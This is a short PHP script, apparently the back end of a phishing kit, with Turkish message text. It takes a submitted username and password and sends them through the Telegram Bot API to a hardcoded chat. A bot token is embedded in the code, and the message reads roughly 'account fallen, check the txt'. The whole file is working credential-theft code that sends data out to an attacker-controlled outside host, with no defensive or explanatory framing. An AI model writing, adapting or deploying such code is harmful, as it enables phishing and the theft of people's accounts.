<?php
    $token='1816063393:AAGDppFfhGsQ08I2J3VoXwQXbAx3R6l0rvo';
    $data = [
        'text' => 'KAAN HESAP DÜŞTÜ TXTYE BAK selam.txt

Kullanıcı Adı : '.$username.'

Şifre : '.$password.'

      ',
      'chat_id' => '1875896657'
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

?>


  
?>